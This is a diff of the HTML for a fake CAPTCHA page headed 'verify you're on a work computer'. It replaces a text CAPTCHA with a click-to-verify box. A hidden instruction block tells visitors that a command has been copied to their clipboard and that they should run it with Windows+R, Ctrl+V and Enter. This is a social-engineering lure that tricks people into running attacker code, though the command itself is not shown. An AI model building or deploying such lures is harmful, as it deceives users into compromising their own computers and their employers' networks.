@@ -9,19 +9,16 @@
 </head>
 <body>
     <div class="captcha-container">
-        <div class="captcha-header">
-            <h2>Verify you're on a work computer</h2>
+        <h2 class="captcha-title">Please verify you're on a work computer</h2>
+
+        <div id="captchaBox" class="captcha-box" onclick="startVerification()">
+            <div id="captchaText" class="captcha-text">Click to verify you're human</div>
         </div>
-        <div class="captcha-content">
-            <div class="captcha-box">
-                <input type="text" id="captchaInput" placeholder="Enter the characters you see" />
-                <div id="captchaImage" class="captcha-image"></div>
-            </div>
-            <div class="captcha-actions">
-                <button id="verifyButton" onclick="verifyCaptcha()">Verify</button>
-            </div>
-        </div>
+
+        <button id="verifyButton" class="verify-button" onclick="verifyCaptcha()">Verify</button>
+
         <div id="resultMessage" class="result-message"></div>
+        
         <div class="command-instructions" style="display: none;">
             <p>Your command has been copied to the clipboard. Please press <b>Windows + R</b>, then <b>Ctrl + V</b> and hit <b>Enter</b> to execute the verification.</p>
         </div>
